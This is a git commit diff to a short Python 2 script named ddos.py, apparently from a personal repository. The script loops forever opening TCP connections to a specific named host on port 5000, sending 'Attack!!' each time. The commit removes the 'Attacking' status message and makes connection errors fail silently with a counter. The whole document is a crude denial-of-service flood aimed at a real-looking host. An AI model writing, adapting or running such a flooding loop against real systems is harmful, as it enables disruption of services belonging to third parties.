5eeb9e65013a82bcf8fd060a005065f4de23f874
Aric Canevari <canevaa@sunyit.edu>
2016-05-05 20:39:33 -0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,14 +1,15 @@
 #!/usr/bin/env python
 #####################
 import socket, sys, os  
- 
+
+a=0
+
 while True:  
     try: 
-	print "Attacking lougreen.ddns.net"
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 	s.connect(("lougreen.ddns.net", 5000))
 	s.send("Attack!!")  
 	print "Attack Successful!"
 	s.close()
     except socket.error:
-	print "Error: No Connection Found"
+	a=a+1
